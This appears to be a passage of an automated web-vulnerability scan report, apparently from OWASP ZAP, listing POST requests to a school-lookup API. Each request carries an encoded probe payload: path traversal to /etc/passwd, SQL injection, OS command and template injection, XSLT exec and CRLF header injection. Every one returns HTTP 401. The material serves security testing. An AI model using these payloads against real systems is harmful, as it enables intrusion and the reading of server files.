* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%252Fetc%252Fpasswd
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%252Fsuggest
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%252FWEB-INF%252Fweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253C%2521--
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253Cxsl%253Avalue-of+select%253D%2522document%2528%2527http%253A%252F%252Fs198d01-ebis-establishment-fa.azurewebsites.net%253A22%2527%2529%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253Cxsl%253Avalue-of+select%253D%2522php%253Afunction%2528%2527exec%2527%252C%2527erroneous_command+2%253E%2526amp%253B1%2527%2529%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%253Cxsl%253Avariable+name%253D%2522rtobject%2522+select%253D%2522runtime%253AgetRuntime%2528%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522process%2522+select%253D%2522runtime%253Aexec%2528%2524rtobject%252C%2527erroneous_command%2527%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522waiting%2522+select%253D%2522process%253AwaitFor%2528%2524process%2529%2522%252F%253E%250A%253Cxsl%253Avalue-of+select%253D%2522%2524process%2522%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%255Csuggest
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%255CWEB-INF%255Cweb.xml
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%255D%255D%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=%257Bsystem%2528%2522sleep+15%2522%2529%257D
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=0W45pz4p
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=5%253BURL%253D%2527https%253A%252F%252F980414377652208366.owasp.org%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=5m9grg8cnmfzezs0oj0l9iotxpbqaujw8yqdjqqf9p8mxyngah8a4bhbx0m
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=any%250ASet-cookie%253A+Tamper%253D0448533a-a0bd-4ad0-a72a-3a27832c92ba
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=any%250D%250ASet-cookie%253A+Tamper%253D0448533a-a0bd-4ad0-a72a-3a27832c92ba
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=any%250D%250ASet-cookie%253A+Tamper%253D0448533a-a0bd-4ad0-a72a-3a27832c92ba%250D%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=any%253F%250ASet-cookie%253A+Tamper%253D0448533a-a0bd-4ad0-a72a-3a27832c92ba
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=any%253F%250D%250ASet-cookie%253A+Tamper%253D0448533a-a0bd-4ad0-a72a-3a27832c92ba
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=any%253F%250D%250ASet-cookie%253A+Tamper%253D0448533a-a0bd-4ad0-a72a-3a27832c92ba%250D%250A
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=c%253A%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=c%253A%252FWindows%252Fsystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=c%253A%255C
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=c%253A%255CWindows%255Csystem.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=cat+%252Fetc%252Fpasswd
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=get-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=http%253A%252F%252F%255C980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=http%253A%252F%252F980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=http%253A%252F%252Fwww.google.com
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=http%253A%252F%252Fwww.google.com%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=http%253A%252F%252Fwww.google.com%253A80%252F
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=https%253A%252F%252F%255C980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=https%253A%252F%252F980414377652208366%25252eowasp%25252eorg
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=https%253A%252F%252F980414377652208366.owasp.org
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=kh2wguzuu0dxxvnikagbjr30fp6rsvyp6sl652mi6wwrfdm6on4xs4jnzzgy
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=lgAQNuluvZfjrnpKuKkHLMiIGYSaSJKqRvkjERulutvllYJardAhUgfNZMLLcsSvQcylFbZhIEXiBqgIdjoIPBwUQPyffMgpBeZunxUqWechaQAsutNgsOVjMExQYOiRnROyLVRtNhqiDidtSSKPEtarIZoqKNfcmXCQXEhrLgloachFsqGHowhdTDrQxxAxReHKCmhrOeTyoXlZWdYOEyrDpXPcgFjjJGULTgPcPZrxmalYgwAufLnNYQOFGYBAwuaWEGHvQiHOQqwvFFEMXitdDwFsoGyyrxLSeJGvRKbYBrejxCdMAPQGSlHcuSFjIuYnjKrsJAsCIgEnjbofjkESPiUcWktKhhvPKXSeQRVmTqXfvwcbuqgNdYoXDanRXRckIGxLWcZyKbLGnDaXBQthrNLUxNbHttaFggpSYMoUXAKlxgnTSuZbNiglyOSYyrvVgRFcuPpLkcZsXRlheFVdaNyFIxNTKkMeiNBFPgVhFdVlPdxFtloUfgImPDfoGmvAKFklIstTuPBnayAMFWQUcjscAhlJpoYCWkvSvJTuBUuqIDqHBUEUKBcePMWkcmBqbResqjQTUvZALRrxdvHkMKMqCKQqAkShTCyWdjopQpxmkfwtQXZYOGETRGuoTMdxBWvqoZYiFiEXRuRbBgiQTMAYlVqlUCHUPhueTIqFMXlKuePHLRvXjEocyOTaJFUjsCjooyQrrppcGxgMeZoOjOAjuRPNJZprqIITVULSZQLyWSWuvYjnCqnkXVKDIqEjjitZOjfGlLNjISJLrnFJClHZyAAreWvBROLrVrUvCXrwquhIxAUINDNNbpcfNfVvZXXIripxAgXRhspCHYdTMeTyPnZiOySFXtPMFfHBfRQIxmTiNIOFcfLZnjIrboiirYKmBdhkAKFclAebIAgveUCGtoIqWyELfDwaplbVrsSYjMFRZtTBRDPxIJgkLanREKcpeeUSwiPcOXjhuMHSurLCSGPJwyvLFRgnuRWNpOkhrpYDiZpcQUhqyKLDMgdnatWYSmfsbcNcrRAuCuShOAmsEFXCRZXoqvVpWSxgpcnxdReGqANwaodpsxdhtoWDUMQYZHgCvCRGOVgJZHCeoEgdWSgbirQiHJaywlNpqbcFDJqwcKhDvsyCKqhEOLhGqeBLiqaqNoSpZisJlyFJQTqHjSojkegbHStcBmIPdjAdYOieHjwucFqRyXeJDsBTLlKfPUhGkcsqNOsIEXNlXmikBiunDfBjGIiimAqMDPFpWPXCPwYhonaOiAJdAvsnprHWpaLheeGvNhmORmpeSuPHRVFmEtXqvFcryljofpwsFpWvEiUygFnbJytZhvkmAFqTYSrUSUgncPMSgNXRrIXjPwMDkQYUoAQZDqOJgdyceDZMpDeWOqmOkwDroeuZvESDYHtPEYnmBPHGctkZRdRcRiIalhRBBaGvdJdelTXOvQeMigOoSaTOAPXvVWgawutGWnLSsctOuXAqfJhZNWmnfyjWGrINDkKqQvXpSXjisIidoKufKbRnEpLkUnDFlfLioNyYLDjtsVjvkKycqXfwjLqWEqvNixcoAOsNCeWnhkxwYHkrDCCfDwHhXexlUyyosjlASfoZlXPSlPPqNxmvDKgnGrjUCGnTuJJHjNxLqtbGYwcJWSrxMeNnskeMEOaOUffPIeBsfapjJJdFlknRgjuQPaUVCjZFRNSbDPnCdqNBjqqYNYxOPmVqUGJYTqSTrScOngZIdVxkaHIgfqGTQmqRBusnsXyrekTPxpGEkuJRjiBnRFaeYdLfRhsfxSFhHWErtGodlbnXYhRqHcEYdqkpCuHXoOAoYmdPBxnmJQpbPMdUZmMYtNxlRbOSMJbMxVCtlBvLdrfGXqCWwMqQoSwpasrqbjDCHpgUygMJdIMGZGUhDjiTySefQSlYLVcUPwfLHbPcHPQOkpCPDPWGtxugQYWEErggFafjRuIATokJRSOlGuVsILvARJinKmmDCvpebJhHkSNYYyBspDmgUsZfuJfSxoGtXrPPJkHIbjHOvPtHnqZYdZKnwPKUSvvWmcmMPOraJnSoYvYdTbQVwqgaZHaSjwPFwyiOtPXRXEoj
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=response.write%2528569%252C959*336%252C305%2529
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=Set-cookie%253A+Tamper%253D0448533a-a0bd-4ad0-a72a-3a27832c92ba
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=suggest
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=system-property%2528%2527xsl%253Avendor%2527%2529%252F%253E
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=thishouldnotexistandhopefullyitwillnot
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=URL%253D%2527http%253A%252F%252F980414377652208366.owasp.org%2527
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%2526cat+%252Fetc%252Fpasswd%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%2526sleep+15.0%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%2526timeout+%252FT+15.0%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%253Bget-help
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%253Bsleep+15.0%253B%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%253Bstart-sleep+-s+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%257Ctimeout+%252FT+15.0
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522+%252F+sleep%252815%2529+%252F+%2522
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools/suggest%3Furns=urns%2522+UNION+ALL+select+NULL+--+
  * Method: `POST`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
